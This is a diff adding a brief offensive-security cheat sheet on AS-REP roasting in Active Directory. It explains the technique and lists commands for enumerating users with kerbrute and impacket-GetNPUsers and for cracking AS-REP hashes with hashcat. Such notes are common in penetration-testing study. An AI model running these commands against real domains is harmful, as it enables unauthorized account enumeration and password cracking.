@@ -1,0 +1,49 @@
+[-]======================================[-]
+    as-rep roasting
+[-]======================================[-]
+
+- ---] Summary
+
+Service accounts have pre-authentication features enabled on service accounts. Prevents bruteforcing. Sometimes you will configure an account to not require pre-authentication. If pre-authentication is ever disabled, you can spoof the service and reach out to the DC and get a valid and ENCRYPTED TGT (Ticket Granting Ticket). You will say "I am this user" and the DC will not validate it because pre-authentication is disabled.
+
+If the password is weak, you can crack the TGT and get the password for that account.
+You now have credentials for that account! :)
+
+
+- ---] How it Works
+=====================
+
+AS-REP Roasting has the same IDEA of Kerberoasting but is different in the fact that an account needs “Do not require Kerberos pre-authentication”. For Kerberos v5 you have to manually go in and disable Kerberos pre-auth. Maybe you would do this for backwards compatibility with Kerberos v4 libraries, which by default a password was not required for authentication. Another difference between the two, is AS-REP requests a Kerberos Authentication Ticket (TGT) not a service authentication ticket (TGS).
+
+
+- ---] Quick Commands
+======================
+
+# Cracking with hashcat
+hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt -o cracked.txt
+
+
+- ---] Kerbrute
+
+Kerbrute will enumerate valid usernames from a list by constructing AS-REQs to reuqesting a TGT from the KDC. If no domain is specified, it will attempt to look a DC up via DNS and SRV records.
+
+# Standard usecase
+kerbrute userenum -dc 10.1.11.120 -d XOR.com users.txt
+
+# Downgrade Hash (Sometimes you will get a hash that is not compatible with hashcat. You will need downgrade to convert the hash for you.)
+kerbrute userenum -dc 10.1.11.120 -d XOR.com users.txt --downgrade
+
+
+
+
+
+- ---] impacket
+
+# Another method for as-rep roasting, similar to kerbrute
+impacket-GetNPUsers -usersfile users.txt -dc-ip 10.11.1.120 DOMAIN/
+
+
+- ---] Misc Notes
+======================
+
+[+] The hash you want for hashcat is: $krb5asrep$23$ (notice $23$)
